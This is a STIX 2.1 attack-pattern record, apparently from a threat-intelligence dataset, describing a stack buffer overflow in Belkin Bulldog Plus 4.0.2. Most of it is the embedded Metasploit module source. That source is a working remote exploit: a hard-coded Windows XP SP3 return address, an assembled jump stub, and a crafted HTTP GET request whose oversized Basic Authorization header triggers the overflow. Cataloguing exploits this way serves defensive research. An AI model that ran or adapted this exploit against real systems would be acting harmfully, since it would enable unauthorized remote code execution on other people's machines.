{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--536e88f3-8f72-4c0f-aacc-b17573562ade",
    "created": "2024-08-14T16:55:01.251736Z",
    "modified": "2024-08-14T16:55:01.25174Z",
    "name": "Belkin Bulldog Plus Web Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Belkin Bulldog Plus 4.0.2 build 1219. When sending a specially crafted http request an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/belkin_bulldog.rb",
            "external_id": "belkin_bulldog.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Belkin Bulldog Plus Web Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Belkin Bulldog Plus\n        4.0.2 build 1219. When sending a specially crafted http request,\n        an attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '54395' ],\n          [ 'BID', '34033' ],\n          [ 'EDB', '8173' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'  =>  'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 English', { 'Ret' => 0x7e4456f7 } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-03-08'))\n  end\n\n  def exploit\n    c = connect\n\n    dwerd = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"call dword [esp+58h]\").encode_string\n\n    filler = [target.ret].pack('V') + dwerd + make_nops(28)\n\n    print_status(\"Trying target #{target.name}...\")\n\n    send_request_raw({\n      'uri'          => payload.encoded,\n      'version'      => '1.1',\n      'method'       => 'GET',\n      'headers'      =>\n      {\n        'Authorization' => \"Basic #{Rex::Text.encode_base64(filler)}\"\n      }\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-08",
    "x_mitre_platforms": [
        "win'"
    ]
}